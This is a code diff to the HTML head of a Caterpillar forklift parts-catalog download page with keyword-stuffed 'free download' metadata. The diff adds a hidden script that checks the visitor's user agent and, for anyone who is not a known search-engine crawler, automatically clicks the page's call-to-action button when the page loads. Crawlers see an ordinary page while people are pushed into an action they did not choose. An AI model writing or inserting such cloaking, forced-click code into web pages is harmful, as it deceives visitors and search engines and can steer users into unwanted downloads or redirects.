@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Caterpillar Forklift MCFA 04.2024 (USA)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Caterpillar Forklift MCFA 04.2024 USA manual including spare parts, repairs, and maintenance info for various models. Available in English.">
     <meta name="keywords" content="Caterpillar Forklift, Caterpillar Forklift MCFA 04.2024, MCFA 04.2024 USA, Caterpillar Forklift spare parts, Caterpillar Forklift workshop manual, Caterpillar Forklift catalog, Caterpillar Forklift parts catalog, Caterpillar Forklift manual 2024, Forklift Truck spare parts, Pallet Truck workshop manual, Caterpillar warehouse equipment manual, Caterpillar Forklift MCFA USA, Caterpillar Forklift MCFA 2024 download, Caterpillar Forklift MCFA 2024 free download, Caterpillar Forklift accessories, Caterpillar Forklift attachments, Caterpillar Forklift repairs, Caterpillar Forklift maintenance, Caterpillar Lift Trucks service manuals, Caterpillar service bulletins, Hand Pallet parts manual, Electric Models workshop manual, Cushion Tire forklift manual, Small Pneumatic Forklift 1-5 ton manual, Large Pneumatic Forklift 6-16 ton manual, Caterpillar Forklift MCFA spare parts download, Caterpillar Forklift MCFA workshop manual download, Caterpillar Forklift MCFA catalog download, Caterpillar Forklift MCFA catalog free download, Caterpillar Forklift MCFA 04.2024 free download, Caterpillar Forklift MCFA 2024 high speed download, Caterpillar Forklift MCFA 2024 download, каталог запчастей погрузчиков Caterpillar, каталог запчастей Caterpillar погрузчики скачать бесплатно, обслуживание погрузчиков Caterpillar 2024, руководство по ремонту погрузчиков Caterpillar, обслуживание Caterpillar поддонов, инвентарь склада Caterpillar скачать, каталог запчастей Caterpillar MCFA 2024 скачать бесплатно, каталог запчастей Caterpillar MCFA 2024, каталог запчастей погрузчиков Caterpillar 2024, каталог запчастей Caterpillar MCFA 04.2024">
     <style>
